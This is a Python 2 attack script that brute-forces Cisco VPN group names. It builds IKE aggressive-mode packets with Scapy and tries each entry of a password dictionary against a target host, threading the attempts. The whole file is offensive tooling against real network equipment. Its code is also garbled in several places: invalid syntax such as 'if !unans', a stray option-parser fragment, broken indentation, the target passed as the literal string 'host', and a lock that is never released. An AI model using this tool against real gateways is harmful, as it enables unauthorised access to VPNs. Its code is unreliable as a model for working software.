#!/usr/bin/env python
# -*- coding: utf-8 -*

'''
Small python script to brute force Cisco Group name
in old Cisco VPN Gateway (info leaks in aggressive mode)
http://www.cisco.com/en/US/products/csr/cisco-sr-20101124-vpn-grpname.html

todo : Ike-Scan --> scapy

'''

__author__ = "C4rt"
__date__ = "26/03/2013"
__version__ = "1.0"
__maintainer__ = "C4rt"
__email__ = "eric.c4rtman@gmail.com"
__status__ = "Production"

try:
    import sys
    import os
    import time
    import subprocess
    from scapy.all import *
    import pexpect
    import optparse
    from threading import *
except ImportError, err:
    raise
    print >>sys.stderr, "[X] Unable to import : %s\n" % err
    sys.exit(1)

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connectISAKMP(host, passwd, hashtype):
    global Stop
    global Fails
    try:
        conn_closed = '0 returned handshake'
        success = 'Dead peer Detection'
        connStr,unans = sr(send(IP(dst="host") / UDP() / ISAKMP(init_cookie=RandString(8),next_payload=1, exch_type=4) / ISAKMP_payload_SA(next_payload=4, DOI=1, prop=ISAKMP_payload_Proposal(next_payload=None, res=0, proposal=1, proto=1, SPIsize=0,trans_nb=1, SPI='', trans=ISAKMP_payload_Transform(next_payload=3, res=0, num=1, id=1, res2=0, transforms=[('Encryption', '3DES-CBC'), ('Hash', hashtype), ('Authentication', 'PSK'), ('GroupDesc', '1024MODPgr'), ('LifeType', 'Seconds'), ('LifeDuration', 28800L,)])))/ISAKMP_payload_KE(next_payload=10,load='\x06C\x92\xcb\x1f\xa5\xc9\xd4\\w\x11\x08\xbf\xe4d\xbd\x88b\x07.=\x07\x8e^Yzh\x13N\x9a\xcb\x1f^\x07\xd8\xc9\x0f\x99\x8es\xe0\x12\xa3\x89\xa8\xa2\xd4\x9c`\xbe\xeeU\x99D\xea\xda\x11\\a\xd3a\xca\x86\x0bSh/\xf0\xa7\xde\xe9\xc2\xd9\x94O5~5\xa6\xdd\x84\xc1\x91L\x9f\x84\xc2_\xed\xabR;d\x05\x88 iV\xd7\x19\xdfo\xcc\xf6\x97\xc6t\xe9\xb8\x89c\x07\x01\x9c;\x97\x1e\xe5\x86\xe7\x07\xe5\xbc\x90\xfd\xac:\r')/ISAKMP_payload_Nonce(next_payload=5, load='\x92%\xd3\x89\xc6\x07m\x1b^\xd9\x97\x95\xa7\xa1\xb9`\x98UMw')/ISAKMP_payload_ID(IDtype=3,ProtoID=17,Port=500,load=passwd)))
            time.sleep(20)
        if !unans:
            print '[+] Success! Password Found: ' + str(passwd)
            Stop = True
        if re.search(conn_closed, unans):
            print '[-] Connection closed by remote host'
            Fails += 1
    except Exception, e:
        print "\n[-] Fail with " + str(passwd)
        exit()

def main():
    parser = optparse.OptionParser('usage %prog -H ' +
                                   '<target host> -d <dictionnary filename> -s <hash type for transform>')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-d', dest='passFile', type='string', help='specify dictionnary with password')
    ="string",help="Target IP address")
    parser.add_option("-s", dest="hash", default="SHA", type="string", help="Hash type for transform. Specify either SHA or MD5 specifically, default is SHA")
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passFile = options.passFile
    hashtype = options.hash

    if os.geteuid() != 0:
        print "Please, run as root."
        exit()
    if host == None or passFile == None:
        print parser.usage
        exit(0)

    print "Brute Force: " + sys.argv[2]
    print "\nPress ctrl+c to exit."
    PF = open(passFile, 'r')
        for line in PF.readlines():
        password = line.strip('\r').strip('\n')
        print " Trying: " + password
        if Stop:
            print '[*] Exiting: Password Found.'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: ' +\
                'Too many connections closed.'
            print '[!] Adjust number of threads.'
            exit(0)
        connection_lock.acquire()
        print '[-] Testing password : ' + str(password)
        t = Thread(target=connectISAKMP,
                   args=(host, password, hashtype))
        child = t.start()

if __name__ == "__main__":
    try:
        main()
    except:
        print "\n\n\n\n", traceback.format_exc()
